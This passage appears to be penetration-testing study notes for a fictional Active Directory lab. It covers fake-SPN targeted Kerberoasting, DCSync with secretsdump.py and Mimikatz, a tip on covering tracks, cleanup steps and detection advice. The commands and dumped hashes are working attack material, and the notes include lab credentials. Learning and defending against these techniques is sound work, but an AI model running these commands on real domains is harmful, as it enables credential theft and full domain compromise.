+MemberName
+----------
+busucher
+spergazed
+
+<SNIP>
+
+damundsen
+dpayne
+```
+
+**Explanation:**
+- `Get-DomainGroupMember` retrieves all members of the specified group by name rather than by DN.
+- `damundsen` now appears in the list — confirming the group addition was successful.
+- At this point, `damundsen` is a member of Help Desk Level 1, which is **nested inside the Information Technology group**, meaning `damundsen` now inherits `GenericAll` over `adunn`.
+
+---
+
+### Creating a Fake SPN on adunn for Targeted Kerberoasting
+
+Our client permitted us to change `damundsen`'s password, but `adunn` is an **admin account that cannot be interrupted** (i.e., we cannot change its password). Since we have `GenericAll` rights, we instead perform a **targeted Kerberoasting attack** — writing a fake SPN to `adunn`'s account, requesting the TGS ticket, then cracking the hash offline. We must be authenticated as a member of the Information Technology group (which `damundsen` now is, via nested membership).
+
+We can now use **[Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/)** to create the fake SPN. `Set-DomainObject` is a PowerSploit/PowerView function that allows modification of any attribute on an Active Directory object when you have the appropriate write permissions. In this case, since we have `GenericAll` over `adunn`, we can write any attribute — including `servicePrincipalName` — making the account temporarily Kerberoastable. We could use the tool **targetedKerberoast** to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.
+
+> **Linux alternative:** The tool `targetedKerberoast` can perform this same attack from Linux — it creates a temporary SPN, retrieves the hash, and deletes the SPN all in one command.
+
+```powershell
+PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
+VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
+VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
+(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
+VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
+```
+
+**Explanation:**
+- `Set-DomainObject` — PowerView function that modifies AD object attributes.
+- `-Credential $Cred2` — uses `damundsen`'s credentials (who has `GenericAll` over `adunn` via IT group membership).
+- `-Identity adunn` — targets `adunn`'s account.
+- `-SET @{serviceprincipalname='notahacker/LEGIT'}` — writes a fake SPN (`notahacker/LEGIT`) to the `servicePrincipalName` attribute, making `adunn` a Kerberoastable account.
+- The verbose output confirms: `Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'`.
+
+---
+
+### Kerberoasting adunn Using Rubeus
+
+```powershell
+PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: Kerberoasting
+[*] Target User            : adunn
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+[*] Total kerberoastable users : 1
+[*] SamAccountName         : adunn
+[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+[*] ServicePrincipalName   : notahacker/LEGIT
+[*] PwdLastSet             : 3/1/2022 11:29:08 AM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$ <SNIP>
+```
+
+**Explanation:**
+- `Rubeus.exe kerberoast` — requests a TGS (Ticket Granting Service) ticket for the specified user's SPN.
+- `/user:adunn` — limits the Kerberoasting to just `adunn`.
+- `/nowrap` — prevents the output hash from wrapping across multiple lines, making it ready to paste directly into Hashcat.
+- The output confirms `notahacker/LEGIT` as the SPN and shows the full `$krb5tgs$23$...` hash ready for offline cracking.
+- The hash can be cracked with Hashcat using mode `13100`: `hashcat -m 13100 <hashfile> /usr/share/wordlists/rockyou.txt`.
+
+> **Once the hash is cracked** and we have `adunn`'s cleartext password, we can now authenticate as `adunn` and perform the **DCSync attack** to retrieve the NTLM password hashes for all users in the domain, which is covered in the next section.
+
+---
+
+## 19.3 Cleanup After the Attack
+
+Cleanup must be performed in a **specific order** because our rights depend on `damundsen` still being in the group:
+
+**Cleanup Order:**
+1. Remove the fake SPN from `adunn`'s account *(must be done first, while we still have GenericAll rights via group membership)*
+2. Remove `damundsen` from the Help Desk Level 1 group
+3. Set `damundsen`'s password back to its original value (if known), or notify the client to reset it/alert the user
+
+> If you remove `damundsen` from the group **first**, you lose `GenericAll` over `adunn` and will no longer be able to clear the fake SPN. Always clean up in this order.
+
+---
+
+### Step 1 — Removing the Fake SPN from adunn's Account
+
+```powershell
+PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+
+VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
+VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
+VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
+(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
+VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'
+```
+
+**Explanation:**
+- `Set-DomainObject` with `-Clear serviceprincipalname` — removes the `servicePrincipalName` attribute from `adunn`'s account entirely, undoing the fake SPN we added.
+- `-Credential $Cred2` — must still use `damundsen`'s credentials since `damundsen` is still in the IT group (with `GenericAll` rights) at this point.
+- The verbose output confirms: `Clearing 'serviceprincipalname' for object 'adunn'`.
+- This is performed **first** because once `damundsen` is removed from the group in Step 2, we lose the `GenericAll` right over `adunn` and can no longer modify their attributes.
+
+---
+
+### Step 2 — Removing damundsen from the Help Desk Level 1 Group
+
+```powershell
+PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'
+True
+```
+
+**Explanation:**
+- `Remove-DomainGroupMember` — PowerView function that removes a user from a domain group; reverses our earlier `Add-DomainGroupMember`.
+- `-Credential $Cred2` — uses `damundsen`'s credentials.
+- The output `True` confirms the removal was successful.
+
+---
+
+### Confirming damundsen was Removed from the Group
+
+```powershell
+PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | ? {$_.MemberName -eq 'damundsen'} -Verbose
+```
+
+**Explanation:**
+- If the command returns **no output**, `damundsen` has been successfully removed from the group.
+- An empty result here is the expected/desired outcome confirming cleanup is complete.
+
+---
+
+### Step 3 — Reset damundsen's Password
+
+The third cleanup step is to restore `damundsen`'s password:
+- If the **original password is known**, reset it back using `Set-DomainUserPassword` with `wley`'s credentials.
+- If the **original password is unknown** (most likely), notify the client so they can reset it themselves and alert `damundsen` to change their password.
+
+> Even after full cleanup, every modification made during the assessment must be **documented in the final report**. The client needs to know exactly what changed, when, and that all changes were reverted. This protects both the tester and the client if questions arise later.
+
+---
+
+### Real-World Note on ACL Attack Chains
+
+This was one example attack path in a fictional lab environment, but similar attack chains are commonly encountered in real-world engagements. A few important considerations:
+
+- In a **large domain**, there could be many ACL attack paths — some shorter and more direct, others longer and more complex.
+- Sometimes an ACL attack chain is **too time-consuming or potentially destructive** for the scope of the assessment. In those cases, it may be preferable to **enumerate the path and present evidence** to the client without executing all the steps, giving them enough information to understand and remediate the issue on their own.
+- Always **communicate with the client** before performing destructive or disruptive actions (like password changes), and ensure written approval is obtained.
+- Each change must be recorded with **start time, end time, and revert confirmation** in your assessment notes.
+
+---
+
+
+
+## 19.4 Detection and Remediation of ACL Abuse
+
+Organizations should implement the following countermeasures:
+
+- **Audit and remove dangerous ACLs** — Regularly run tools like BloodHound to identify and remove overly permissive ACEs.
+- **Monitor group membership** — Set up alerts for changes to high-impact groups; any modification could indicate an ACL attack chain.
+- **Audit for ACL changes using Event ID 5136** — Enable the Advanced Security Audit Policy. Event ID `5136: A directory service object was modified` is triggered when domain objects are modified, which may indicate ACL tampering.
+
+### Convert SDDL String to Human-Readable Format
+
+```powershell
+PS C:\htb> ConvertFrom-SddlString "<SDDL_STRING_HERE>"
+```
+
+**Explanation:**
+- When Event ID 5136 is captured, the permission change is recorded in **SDDL (Security Descriptor Definition Language)** format, which is not human-readable.
+- `ConvertFrom-SddlString` converts this SDDL data into a readable format showing `Owner`, `Group`, `DiscretionaryAcl`, and `SystemAcl` properties.
+- Filter on `DiscretionaryAcl` to identify suspicious entries such as `GenericWrite` granted to non-admin users.
+
+---
+
+# 20. DCSync Attack
+
+## 20.1 What is DCSync and How Does it Work?
+
+DCSync is a powerful attack technique for stealing the Active Directory password database by abusing the built-in **Directory Replication Service Remote Protocol (DS-RPC)**, which Domain Controllers use to replicate domain data. The attacker mimics a Domain Controller to request user NTLM password hashes directly from another DC. The attack relies on the `DS-Replication-Get-Changes-All` extended right — an access control right that permits replication of secret (password) data.
+
+To perform this attack, you must have control over an account that has the rights to perform domain replication — specifically a user with the **Replicating Directory Changes** and **Replicating Directory Changes All** permissions set. Domain/Enterprise Admins and default domain administrators have this right by default. However, it is common during an assessment to find other non-admin accounts that have been granted these rights, either intentionally for a specific purpose or accidentally through a misconfiguration.
+
+Once such an account is compromised, its access can be used to retrieve the **current NTLM password hash** for any domain user, as well as hashes corresponding to their **previous passwords** (via password history). This makes DCSync one of the most impactful attacks available once replication rights are identified.
+
+> **Note:** If you have certain rights such as `WriteDacl` over a user account, you could also **add** the replication privilege to a user you control, perform the DCSync, and then **remove the privilege** to attempt to cover your tracks.
+
+DCSync can be performed using tools such as **Mimikatz**, **Invoke-DCSync**, and **Impacket's secretsdump.py**.
+
+---
+
+## 20.2 Verifying Replication Rights
+
+### Viewing adunn's Replication Privileges through ADSI Edit
+
+The replication rights can be viewed graphically via **ADSI Edit** (adsiedit.msc) by navigating to the domain root object (`DC=INLANEFREIGHT,DC=LOCAL`), opening its properties, going to the **Security** tab, and viewing the permissions for the `adunn` account. This shows the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` extended rights assigned to a standard domain user — a clear misconfiguration that enables the DCSync attack.
+
+Here we have a standard domain user (`adunn`) that has been granted the replicating permissions outside of their normal role. Let's confirm this programmatically.
+
+---
+
+### Using Get-DomainUser to View adunn's Group Membership
+
+```powershell
+PS C:\htb> Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl
+
+samaccountname     : adunn
+objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
+memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
+                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
+                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
+                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
+useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+```
+
+**Explanation:**
+- `Get-DomainUser -Identity adunn` retrieves the full object attributes for the `adunn` account.
+- The `memberof` field shows `adunn` is only a member of standard groups like **VPN Users**, **Printer Access**, and **File Share H Drive** — confirming this is a **standard domain user**, not a Domain Admin or privileged built-in account.
+- `useraccountcontrol: NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD` — a typical non-admin account configuration.
+- The `objectsid` value (`...1164`) is what we use in the next command to search ACLs specifically for this account.
+- This confirms we are working with a regular user that has been granted replication rights via a direct ACL assignment — a dangerous misconfiguration.
+
+---
+
+### Using Get-ObjectAcl to Check adunn's Replication Rights
+
+PowerView can be used to confirm this standard user does indeed have the necessary replication permissions. We first get the user's SID from the command above and then check all ACLs set on the domain object (`DC=inlanefreight,DC=local`) using `Get-ObjectAcl`, searching specifically for replication rights:
+
+```powershell
+PS C:\htb> $sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
+PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
+ObjectAceType         : DS-Replication-Get-Changes
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
+ObjectAceType         : DS-Replication-Get-Changes-All
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
+ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
+ObjectAceType         : DS-Replication-Get-Changes
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
+ObjectAceType         : DS-Replication-Get-Changes-All
+```
+
+**Explanation:**
+- `$sid = "S-1-5-21-...1164"` — stores `adunn`'s SID for filtering.
+- `Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs` — retrieves all ACEs on the domain root object with human-readable right names.
+- `$_.ObjectAceType -match 'Replication-Get'` — filters to only show replication-related extended rights.
+- `$_.SecurityIdentifier -match $sid` — further filters to only show entries where `adunn`'s SID is the principal.
+- The output confirms `adunn` (SID ending in `1164`) has **three** replication rights on the domain object:
+  - `DS-Replication-Get-Changes` — allows replicating general domain data.
+  - `DS-Replication-Get-Changes-All` — allows replicating **secret data including password hashes** — the critical right for DCSync.
+  - `DS-Replication-Get-Changes-In-Filtered-Set` — allows replicating filtered/read-only DC data.
+- Together, these three rights confirm `adunn` **can perform a full DCSync attack**.
+- The first two entries (SIDs ending in `498` and `516`) belong to default built-in groups (Enterprise Read-Only DCs and Domain Controllers) — these are expected. Only `adunn`'s SID (`1164`) is abnormal.
+
+---
+
+## 20.3 Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
+
+Running the tool as below will write all hashes to files with the prefix `inlanefreight_hashes`. The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file. If we had certain rights over the user (such as **WriteDacl**), we could also add this replication privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks.
+
+```bash
+$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
+
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
+[*] Searching for NTDS.dit
+[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
+[*] Using smbexec method for remote execution
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
+[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
+inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
+guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
+ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
+ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::
+ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::
+inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
+inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+
+<SNIP>
+
+[*] ClearText password from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
+proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
+[*] Cleaning up...
+```
+
+**Explanation:**
+- `secretsdump.py` from the Impacket toolkit contacts the Domain Controller and requests credential data by impersonating a replication partner using `adunn`'s credentials.
+- `-outputfile inlanefreight_hashes` — saves output to files prefixed with `inlanefreight_hashes` in the current directory.
+- `-just-dc` — extracts only NTLM hashes and Kerberos keys from NTDS (skips SAM/LSA).
+- The output format is `domain\username:RID:LMhash:NThash:::` — the NT hash (last field before `:::`) is what is used for Pass-the-Hash or cracking.
+- A cleartext password for `proxyagent` also appears — this account has **reversible encryption** enabled (covered in section 4.4).
+- Additional useful flags:
+  - `-just-dc-ntlm` — output only NTLM hashes (no Kerberos keys)
+  - `-just-dc-user <USERNAME>` — dump a single user only
+  - `-pwd-last-set` — show when each account's password was last changed
+  - `-history` — include previous password hashes (useful for offline cracking and password strength reporting)
+  - `-user-status` — show whether accounts are enabled or disabled (useful for filtering disabled accounts from reporting metrics)
+
+---
+
+### Listing the Output Files — Hashes, Kerberos Keys, and Cleartext Passwords
+
+If we check the files created using the `-just-dc` flag, we will see that there are three output files:
+
+```bash
+$ ls inlanefreight_hashes*
+
+inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
+```
+
+**Explanation:**
+- Three output files are generated from the `-just-dc` flag:
+  - `inlanefreight_hashes.ntds` — all NTLM hashes in `domain\user:RID:LMhash:NThash:::` format.
+  - `inlanefreight_hashes.ntds.kerberos` — Kerberos AES256/AES128/DES keys for all accounts.
+  - `inlanefreight_hashes.ntds.cleartext` — cleartext passwords for any accounts with reversible encryption enabled.
+- These files are the primary deliverable of the DCSync attack and can be used for Pass-the-Hash, offline cracking, or credential re-use testing across the environment.
+
+---
+
+## 20.4 Checking for Reversible Encryption
+
+When reversible encryption is enabled on a user account, it does **not** mean passwords are stored in plaintext. Instead, they are stored using **RC4 encryption**. The key needed to decrypt them is stored in the registry (the **Syskey**) and can be extracted by a Domain Admin or equivalent. Tools such as `secretsdump.py` will automatically decrypt these passwords while performing DCSync. If this setting is later disabled on an account, the user must change their password before it is stored using one-way encryption. Any passwords set while this setting is enabled will remain stored using reversible encryption until changed.
+
+This setting is typically configured to support applications that use protocols requiring access to the user's plaintext password for authentication purposes.
+
+### Viewing an Account with Reversible Encryption Password Storage Set
+
+This setting is visible in Active Directory Users and Computers under the **Account** tab of the user's properties — the checkbox **"Store password using reversible encryption"** will be ticked. While rare, we see accounts with this setting from time to time. It would typically be set to provide support for applications that use certain protocols that require a user's password to be used for authentication purposes.
+
+When this option is set on a user account, it does **not** mean that the passwords are stored in cleartext. Instead, they are stored using **RC4 encryption**. The trick here is that the key needed to decrypt them is stored in the registry (the **Syskey**) and can be extracted by a Domain Admin or equivalent. Tools such as `secretsdump.py` will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync. If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption. Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed.
+
+### Enumerating Further using Get-ADUser
+
+```powershell
+PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+
+DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+Enabled            : True
+GivenName          :
+Name               : PROXYAGENT
+ObjectClass        : user
+ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
+SamAccountName     : proxyagent
+SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
+Surname            :
+userAccountControl : 640
+UserPrincipalName  :
+```
+
+**Explanation:**
+- `-Filter 'userAccountControl -band 128'` — the `-band` operator performs a bitwise AND check. The value `128` corresponds to the `ENCRYPTED_TEXT_PWD_ALLOWED` flag in the `userAccountControl` bitmask.
+- The output reveals that the `proxyagent` service account has this flag set — `userAccountControl: 640` = `NORMAL_ACCOUNT (512) + ENCRYPTED_TEXT_PWD_ALLOWED (128)`.
+- This confirms which accounts will have cleartext passwords visible in the `.ntds.cleartext` file after DCSync.
+
+---
+
+### Checking for Reversible Encryption Option using Get-DomainUser
+
+```powershell
+PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
+
+samaccountname                         useraccountcontrol
+--------------                         ------------------
+proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
+```
+
+**Explanation:**
+- PowerView's `Get-DomainUser` with the `useraccountcontrol` filter provides a more human-readable output than `Get-ADUser`.
+- The filter `*ENCRYPTED_TEXT_PWD_ALLOWED*` matches any account where that flag is present in the string representation of the `userAccountControl` field.
+- Confirms `proxyagent` is the account with reversible encryption — consistent with what `secretsdump.py` already revealed.
+
+---
+
+### Displaying the Decrypted Password
+
+```bash
+$ cat inlanefreight_hashes.ntds.cleartext
+
+proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
+```
+
+**Explanation:**
+- The `.ntds.cleartext` file contains the decrypted passwords for all accounts with reversible encryption enabled.
+- The format is `username:CLEARTEXT:password`.
+- The password `Pr0xy_ILFREIGHT!` was decrypted automatically by `secretsdump.py` using the Syskey extracted from the target's registry during execution.
+- This cleartext password can be used immediately for authentication without any cracking. Always test it for password re-use across other accounts and services in the environment.
+- Some organizations enable reversible encryption for **all** user accounts to allow periodic NTDS audits without offline cracking — an extremely risky practice that provides attackers with ready-to-use credentials directly from DCSync.
+
+---
+
+## 20.5 Performing DCSync with Mimikatz (Windows)
+
+We can perform the DCSync attack with Mimikatz as well. Using Mimikatz, we must target a specific user. Here we will target the built-in **administrator** account. We could also target the `krbtgt` account and use this to create a **Golden Ticket** for persistence, but that is outside the scope of this module.
+
+It is important to note that **Mimikatz must be run in the context of the user who has DCSync privileges** (`adunn` in this case). We cannot just open Mimikatz as our current unprivileged user — it needs to authenticate as `adunn` when making replication requests to the DC. We use `runas.exe` to accomplish this.
+
+### Using runas.exe
+
+```cmd
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
+Enter the password for INLANEFREIGHT\adunn:
+Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
+```
+
+**Explanation:**
+- `runas /netonly` — launches a new process using the specified credentials **only for network authentication**. The process runs locally as the current user but uses `adunn`'s credentials for any network operations (like contacting the DC for DCSync).
+- `/user:INLANEFREIGHT\adunn` — specifies the user context for network authentication.
+- `powershell` — the process to launch. After entering `adunn`'s password (obtained from cracking the Kerberoasted hash), a new PowerShell window opens where all network calls authenticate as `adunn`.
+
+---
+
+### Performing the Attack with Mimikatz
+
+From the newly spawned PowerShell session (running in the context of `adunn` for network auth), we can perform the attack:
+
+```powershell
+PS C:\htb> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+[DC] 'INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'INLANEFREIGHT\administrator' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : administrator
+User Principal Name  : administrator@inlanefreight.local
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 10/27/2021 6:49:32 AM
+Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: 88ad09182de639ccc6579eb0849751cf
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 4625fd0c31368ff4c255a3b876eaac3d
+
+<SNIP>
+```
+
+**Explanation:**
+- `privilege::debug` — requests the `SeDebugPrivilege` right, which Mimikatz needs to interact with privileged processes for DCSync.
+- `lsadump::dcsync` — the Mimikatz module that performs the DCSync attack by making RPC/DRSUAPI calls to the Domain Controller.
+- `/domain:INLANEFREIGHT.LOCAL` — specifies the target domain. Required when the current session's domain differs from the target domain.
+- `/user:INLANEFREIGHT\administrator` — the account whose credential data to retrieve. Can be any domain account — including `krbtgt` for Golden Ticket creation.
+- The output under `Credentials:` shows `Hash NTLM: 88ad09182de639ccc6579eb0849751cf` — the NT hash of the Administrator account, ready for Pass-the-Hash or offline cracking.
+
+---
+
+# 21. Privileged Access
+
+## 21.1 Overview of Lateral Movement Methods
+
+Once a foothold is established in the domain, the goal shifts to lateral movement and privilege escalation. Typically, if we take over an account with local admin rights over a host or set of hosts, we can perform a **Pass-the-Hash** attack to authenticate via the SMB protocol. But what if we don't yet have local admin rights on any hosts in the domain? There are several other ways we can move around a Windows domain:
+
+- **Remote Desktop Protocol (RDP)** — A remote access/management protocol that gives us GUI access to a target host.
+- **PowerShell Remoting (PSRemoting / WinRM)** — A remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell.
+- **MSSQL Server** — An account with sysadmin privileges on a SQL Server instance can log in remotely and execute queries. This access can be used to run OS commands in the context of the SQL Server service account.
+
+BloodHound can visualize the following edge types for identifying remote access rights:
+
+- **CanRDP** — Remote Desktop Protocol access
+- **CanPSRemote** — PowerShell Remoting / WinRM access
+- **SQLAdmin** — SQL Server sysadmin privileges
+
+> **Scenario Setup:** This section moves between a Windows and Linux attack host. RDP into MS01 (`htb-student:Academy_student_AD!`). For Linux portions (mssqlclient.py and evil-winrm), SSH to `172.16.5.225` with credentials `htb-student:HTB_@cademy_stdnt!`. Try all methods — `Enter-PSSession` and `PowerUpSQL` from Windows, and `evil-winrm` and `mssqlclient.py` from Linux.
+
+---
+
+## 21.2 Remote Desktop (RDP) Access
+
+RDP access with a non-admin user is still valuable — it allows launching further attacks, escalating privileges, and pillaging the host for sensitive data or credentials. The first thing to check after importing BloodHound data is: **Does the Domain Users group have local admin rights or execution rights (RDP or WinRM) over one or more hosts?**
+
+### Enumerating the Remote Desktop Users Group
+
+```powershell
+PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
+
+ComputerName : ACADEMY-EA-MS01
+GroupName    : Remote Desktop Users
+MemberName   : INLANEFREIGHT\Domain Users
+SID          : S-1-5-21-3842939050-3880317879-2865463114-513
+IsGroup      : True
+IsDomain     : UNKNOWN
+```
+
+**Explanation:**
+- `Get-NetLocalGroupMember` queries the members of a local group on a remote computer.
+- `-GroupName "Remote Desktop Users"` retrieves all accounts with RDP access to that machine.
+- The output shows **all Domain Users** can RDP to this host — a significant misconfiguration common on RDS hosts or jump boxes. This type of server may hold sensitive data or offer a local privilege escalation path.
+
+---
+
+### BloodHound Queries for RDP Rights
+
+In BloodHound, use:
+- **Analysis tab** → `Find Workstations where Domain Users can RDP`
+- **Analysis tab** → `Find Servers where Domain Users can RDP`
+- **Node Info tab** → **Execution Rights** to view a specific user's RDP rights (direct or via group membership)
+
+To test RDP access, use `xfreerdp` or `Remmina` from Linux, or `mstsc.exe` from a Windows host.
+
+---
+
+## 21.3 WinRM / PowerShell Remoting Access
+
+### Enumerating the Remote Management Users Group
+
+```powershell
+PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
